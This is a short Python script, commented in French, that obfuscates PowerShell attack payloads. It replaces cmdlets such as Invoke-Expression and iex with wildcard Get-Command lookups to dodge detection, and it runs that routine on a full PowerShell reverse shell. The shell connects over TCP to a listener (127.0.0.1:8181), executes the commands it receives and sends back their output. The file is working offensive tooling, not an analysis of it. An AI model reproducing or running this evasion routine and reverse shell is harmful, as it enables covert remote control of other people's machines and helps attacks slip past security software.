import random

def put_char(word: str, char: str):
    new_word = ""
    if word.find("-") > 0:
        parts = word.split("-")
        for i in range(len(parts)):
            for j in range(len(parts[i])):
                if j%2 == 0 and j != 0 and j != len(parts[i]) -1:
                    new_word += (char * random.randint(1, 20))
                else:
                    new_word += parts[i][j]
            if i != len(parts) -1:
                new_word += "-"
    else:
        for i in range(len(word)):
                if i%2 != 0 and i != 0 and i != len(word) -1:
                    new_word += (char * random.randint(1, 20))
                else:
                    new_word += word[i]

    return new_word


def gcm(payload: str):
    """
        Remplace les cmdlet par un gcm, attention cela baisse les performances de votre payload en contrepartie d'une meilleure entropie
    """
    cmdlets = ["iex", "invoke-expression", "invoke-restmethod"]
    for i in range(len(cmdlets)):    
        while payload.lower().find(cmdlets[i]) > 0:
            word = put_char(cmdlets[i], "*")
            choice = random.choice(["get-command", "gcm"])
            payload = payload.lower().replace(cmdlets[i], f"&({choice} {word})")

    return payload


if __name__ == "__main__":
    print(gcm("$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 8181);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"))
